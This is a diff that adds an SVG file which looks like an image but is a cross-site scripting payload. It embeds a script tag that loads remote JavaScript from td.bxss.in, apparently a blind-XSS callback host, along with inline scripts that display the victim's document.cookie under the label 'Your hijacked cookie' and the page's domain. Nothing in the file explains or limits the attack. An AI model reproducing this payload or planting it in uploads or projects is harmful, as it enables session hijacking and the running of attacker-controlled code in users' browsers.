@@ -1,0 +1,9 @@
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+  <script type="text/javascript"  xlink:href="https://td.bxss.in"></script>
+  <script type="text/javascript">
+    alert("Your hijacked cookie: " + document.cookie);
+  </script>
+  <script type="text/javascript">
+    alert(document.domain);
+  </script>
+</svg>
